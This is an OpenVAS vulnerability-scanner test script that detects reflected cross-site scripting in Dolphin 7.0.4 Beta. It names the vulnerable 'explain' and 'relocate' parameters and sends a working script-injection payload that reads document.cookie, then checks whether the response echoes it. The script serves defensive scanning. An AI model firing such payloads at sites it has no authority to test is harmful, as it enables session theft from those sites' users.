###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_dolphin_multiple_xss_vuln.nasl 7044 2017-09-01 11:50:59Z teissa $
#
# Dolphin Multiple Reflected Cross Site Scripting Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801910");
  script_version("$Revision: 7044 $");
  script_tag(name:"last_modification", value:"$Date: 2017-09-01 13:50:59 +0200 (Fri, 01 Sep 2017) $");
  script_tag(name:"creation_date", value:"2011-04-11 14:40:00 +0200 (Mon, 11 Apr 2011)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("Dolphin Multiple Reflected Cross Site Scripting Vulnerabilities");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/98408/Dolphin7.0.4-xss.txt");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name : "impact" , value : "Successful exploitation will allow attackers to execute arbitrary
  script code in the browser of an unsuspecting user in the context of an affected site.

  Impact Level: Application");
  script_tag(name : "affected" , value : "Dolphin version 7.0.4 Beta");
  script_tag(name : "insight" , value : "Multiple flaws are due to:
  - Input passed via the 'explain' parameter in 'explanation.php' script
  and 'relocate' parameter in '/modules/boonex/custom_rss/post_mod_crss.php'
  script is not properly sanitized before being returned to the user.");
  script_tag(name : "solution" , value : "No solution or patch was made available for at least one year
  since disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");
  script_tag(name : "summary" , value : "This host is running Dolphin and is prone to multiple reflected
  cross-site scripting vulnerabilities.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
dolPort = get_http_port(default:80);

## Check Host Supports PHP
if(!can_host_php(port:dolPort)){
  exit(0);
}

foreach path (make_list_unique("/dolphin", "/", cgi_dirs(port:dolPort)))
{

  if(path == "/") path = "";

  ## Send and Receive the response
  rcvRes = http_get_cache(item: path + "/index.php", port:dolPort);

  ##  Confirm server installation for each path
  if("<title>Dolphin" >< rcvRes)
  {
    ## Send the constructed request
    sndReq = http_get(item:string(path, '/modules/boonex/custom_rss/' +
                      'post_mod_crss.php?relocate="><script>alert' +
                      '(document.cookie)</script>'), port:dolPort);
    rcvRes = http_keepalive_send_recv(port:dolPort, data:sndReq);

    ## Check the response after exploit
    if(rcvRes =~ "HTTP/1\.. 200" && "><script>alert(document.cookie)</script>" >< rcvRes)
    {
      security_message(port:dolPort);
      exit(0);
    }
  }
}

exit(99);
